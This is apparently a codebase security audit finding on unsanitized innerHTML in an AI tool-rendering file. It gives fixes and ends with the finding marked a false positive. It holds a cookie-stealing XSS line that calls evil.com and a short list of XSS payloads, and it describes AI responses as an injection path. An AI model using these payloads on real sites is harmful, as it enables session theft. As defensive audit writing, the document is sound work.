# 016.2: innerHTML Without Sanitization

## Severity: HIGH

## Location

**File:** `src/ai/tools/advanced-tools.ts`
**Context:** AI tool rendering user/AI-generated content

## The Problem

AI tools render content to DOM using `innerHTML` without sanitization. Malicious content from AI responses or user input can execute arbitrary JavaScript.

### Vulnerable Pattern

```typescript
// VULNERABLE - Direct innerHTML assignment
element.innerHTML = aiGeneratedContent;
```

### Attack Vector

```
User prompt: "Create an HTML preview"
AI response includes: <img src=x onerror="fetch('evil.com?cookie='+document.cookie)">
Result: Cookie exfiltration
```

### XSS Payload Examples

```html
<!-- Event handlers -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">

<!-- Script tags -->
<script>alert(1)</script>

<!-- Data URIs -->
<a href="javascript:alert(1)">click</a>

<!-- CSS injection -->
<style>@import 'https://evil.com/steal.css'</style>
```

## Proposed Fix

### Option A: DOMPurify (Recommended)

```typescript
import DOMPurify from "dompurify";

function safeInnerHTML(element: Element, content: string): void {
  element.innerHTML = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'class'],
    ALLOW_DATA_ATTR: false,
  });
}
```

### Option B: textContent for Plain Text

```typescript
// When HTML not needed
element.textContent = untrustedContent;
```

### Option C: Template Literals with Escaping

```typescript
function escapeHTML(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

## Status: ❌ FALSE POSITIVE

### Resolution

Investigation found that `src/cli/mcp/advanced-tools.ts` does NOT use `innerHTML`. The codebase already has comprehensive HTML sanitization:

- `src/security/client/html-sanitizer.ts` — Provides `validateTrustedHtml()` with suspicious pattern detection, `createSafeTextNode()`, `setSafeTextContent()`, and `createErrorDisplay()` using safe DOM APIs
- `src/html/html-escape.ts` — HTML escaping utility

The 16 `innerHTML` usages in the codebase fall into: React hydration (trusted server HTML validated by `validateTrustedHtml`), dev-only error overlays, and test files.
